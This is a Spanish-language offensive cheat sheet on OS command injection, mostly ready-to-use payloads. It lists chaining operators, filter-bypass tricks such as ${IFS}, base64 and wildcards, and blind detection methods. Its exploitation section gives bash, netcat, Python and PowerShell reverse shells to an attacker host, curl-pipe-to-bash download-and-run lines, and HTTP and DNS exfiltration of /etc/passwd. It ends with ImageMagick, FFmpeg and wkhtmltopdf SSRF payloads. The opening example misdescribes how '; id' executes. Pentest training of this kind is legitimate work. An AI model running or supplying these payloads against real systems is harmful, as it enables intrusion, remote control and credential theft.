---
icon: database
---

# Command Injection

Command Injection permite ejecutar comandos arbitrarios del sistema operativo a través de una aplicación que pasa input del usuario a una shell sin sanitización adecuada. Es directamente RCE.

```php
// Código vulnerable típico (PHP)
$filename = $_GET['file'];
system("convert " . $filename . " output.png");

// Input normal:    convert report.pdf output.png
// Input malicioso: convert report.pdf; id output.png
//                  → ejecuta: convert report.pdf | id | output.png
```

### Contextos comunes

```
Funcionalidades que frecuentemente llaman al SO:
→ Conversión de archivos (convert, ffmpeg, ghostscript)
→ Ping / traceroute / nslookup en la app
→ Compresión de archivos (zip, tar, gzip)
→ Envío de emails (sendmail, mail)
→ Procesamiento de imágenes (ImageMagick, exiftool)
→ Generación de PDFs (wkhtmltopdf, pandoc)
→ Ejecución de scripts de backup/mantenimiento
→ Dispositivos de red (routers, firewalls con interfaz web)
→ Campos de hostname / IP en formularios de diagnóstico
→ Nombre de archivo al subir archivos
```

### Operadores de encadenamiento de comandos

#### Linux

```bash
# ; → ejecuta cmd2 siempre, independientemente de cmd1
cmd1; cmd2
ping -c 1 127.0.0.1; id

# && → ejecuta cmd2 solo si cmd1 tuvo éxito
cmd1 && cmd2
ping -c 1 127.0.0.1 && id

# || → ejecuta cmd2 solo si cmd1 falló
cmd1 || cmd2
ping -c 1 999.999.999.999 || id

# | → pipe, pasa output de cmd1 a cmd2
cmd1 | cmd2
ping -c 1 127.0.0.1 | id

# ` ` → backticks, sustitución de comandos
`id`
ping -c 1 `id`

# $() → sustitución de comandos (más moderno)
$(id)
ping -c 1 $(id)

# \n → newline, separador de comandos
ping -c 1 127.0.0.1%0aid
```

#### Windows

```cmd
& → ejecuta cmd2 siempre
cmd1 & cmd2
ping 127.0.0.1 & whoami

&& → ejecuta cmd2 si cmd1 tuvo éxito
ping 127.0.0.1 && whoami

|| → ejecuta cmd2 si cmd1 falló
ping 999.999.999 || whoami

| → pipe
ping 127.0.0.1 | whoami

; → funciona en PowerShell
ping 127.0.0.1; whoami
```

### Detección

#### Inyección directa (output visible)

```bash
# Probar con comandos inofensivos cuyo output es reconocible
; id
; whoami
& whoami
| whoami
`whoami`
$(whoami)

# En campo de IP/host
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
127.0.0.1 || id
127.0.0.1%0aid          ← newline URL encoded
127.0.0.1%0a%0did       ← CRLF

# En nombre de archivo
file.pdf; id
"file.pdf; id"
file.pdf|id
$(id).pdf
```

#### Inyección blind (sin output visible)

```bash
# Time-based: si el servidor tarda N segundos → comando ejecutado
; sleep 5
& ping -c 5 127.0.0.1   ← 5 pings = ~5 segundos de delay
& timeout /T 5           ← Windows
$(sleep 5)
`sleep 5`

# Verificar:
→ Tiempo de respuesta normal: ~200ms
→ Con payload: ~5200ms → confirmado
```

#### Out-of-band (DNS/HTTP al servidor del atacante)

```bash
# Linux — DNS lookup
; nslookup attacker.com
; nslookup $(whoami).attacker.com      ← output del comando en el subdominio
$(nslookup $(id).attacker.com)
`curl http://attacker.com/$(id)`

# Linux — HTTP
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?cmd=$(id)
; curl -d "$(cat /etc/passwd)" http://attacker.com/exfil

# Windows
& nslookup attacker.com
& powershell Invoke-WebRequest http://attacker.com/$(whoami)
```

### Bypass de filtros

#### 1. Espacios

```bash
# Si los espacios están filtrados
${IFS}                    → Internal Field Separator (equivale a espacio en bash)
$IFS                      
{cat,/etc/passwd}         → bash brace expansion sin espacios
cat</etc/passwd           → redirección como separador
cat%09/etc/passwd         → TAB (URL encoded)
X=$'cat\x20/etc/passwd'&&$X
```

#### 2. Palabras clave filtradas (cat, whoami, id...)

```bash
# Comillas insertadas en la palabra
c'a't /etc/passwd
c"a"t /etc/passwd
wh\oami
who$()ami
who$(echo '')ami          ← subshell vacía

# Variables
a=cat;$a /etc/passwd
a=c;b=at;$a$b /etc/passwd

# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
$(echo "d2hvYW1p" | base64 -d)

# Hex
$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Wildcards
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
/???/c?t /e??/p?ss??
```

#### 3. Slash filtrado (`/`)

```bash
# Variables de entorno que contienen /
${HOME:0:1}               → /
${PATH:0:1}               → /

echo ${HOME:0:1}etc${HOME:0:1}passwd
cat ${HOME:0:1}etc${HOME:0:1}passwd

# cd y rutas relativas
cd /;cat etc/passwd
```

#### 4. Semicolons y operadores filtrados

```bash
# Newline como separador de comandos
%0a  → \n
%0d%0a → \r\n

# Backticks si ; está filtrado
`id`
`whoami`

# $() si backticks filtrado
$(id)
$(whoami)
```

#### 5. Longitud máxima

```bash
# Si hay límite de caracteres, usar técnicas de fragmentación
# Escribir el payload en partes a un archivo temporal
>cmd<
>>ls<
# Luego ejecutar el archivo construido
```

### Explotación

#### Reconocimiento básico

```bash
# Linux
; id
; whoami
; hostname
; uname -a
; cat /etc/passwd
; cat /etc/shadow
; ls -la /home
; env
; ps aux
; netstat -tulpn
; ip a

# Windows
& whoami
& hostname
& systeminfo
& net user
& net localgroup administrators
& ipconfig /all
& dir C:\
```

#### Reverse shell desde command injection

```bash
# Bash
; bash -i >& /dev/tcp/attacker/9001 0>&1
; bash -c 'bash -i >& /dev/tcp/attacker/9001 0>&1'

# Netcat
; nc -e /bin/bash attacker 9001
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 9001 >/tmp/f

# Python
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Curl → descargar y ejecutar
; curl http://attacker/shell.sh | bash
; wget -qO- http://attacker/shell.sh | bash

# Windows PowerShell
& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Exfiltración de datos (cuando no hay reverse shell)

```bash
# Via HTTP GET
; curl "http://attacker/exfil?data=$(cat /etc/passwd | base64 -w0)"
; wget "http://attacker/exfil?user=$(whoami)"

# Via DNS
; nslookup $(cat /etc/passwd | head -1 | base64 -w0 | tr '+/' '-_').attacker.com
# Cada query DNS llega al servidor del atacante con datos en el subdominio

# Via archivo en webroot (si tenemos acceso web)
; cat /etc/passwd > /var/www/html/out.txt
# Luego: curl https://target.com/out.txt
```

### Command Injection en contextos específicos

#### ImageMagick — ImageTragick (CVE-2016-3714)

```
# Crear archivo de imagen con payload en el nombre/metadata
# Archivo MVG (Magick Vector Graphics) malicioso:

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|id")'
pop graphic-context
```

#### FFmpeg SSRF / Command Injection

```bash
# Archivo HLS malicioso que hace SSRF
# Contenido del .m3u8:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://attacker/$(id)
#EXT-X-ENDLIST
```

#### wkhtmltopdf SSRF

```html
<!-- Si la app genera PDFs desde HTML usando wkhtmltopdf -->
<!-- Inyectar en el HTML que se convierte: -->
<iframe src="http://169.254.169.254/latest/meta-data/">
<script>
  x=new XMLHttpRequest;
  x.onload=function(){document.write(this.responseText)};
  x.open("GET","file:///etc/passwd");
  x.send();
</script>
```

### Checklist

```
□ Probar ; id y & whoami en todos los parámetros
□ Probar time-based si no hay output: ; sleep 5
□ Probar en campos de ping/nslookup/traceroute
□ Probar en nombres de archivo al subir
□ Probar en campos de conversión/procesamiento
□ Si hay filtro: probar ${IFS}, backticks, $()
□ Si hay filtro de palabras: probar con comillas o variables
□ Configurar Burp Collaborator / Interactsh para OOB
```

> Los campos de diagnóstico de red (ping, nslookup, traceroute) en paneles de administración son los más frecuentemente vulnerables a command injection — son funcionalidades que por definición llaman al SO.

> Cuando el output no es visible, siempre usar time-based (`sleep 5`) para confirmar la ejecución antes de intentar reverse shells.

> Los operadores `&&` y `||` solo ejecutan el segundo comando si el primero tiene éxito o falla respectivamente. Usar `;` o `|` para ejecución incondicional cuando se desconoce si el comando base tendrá éxito.
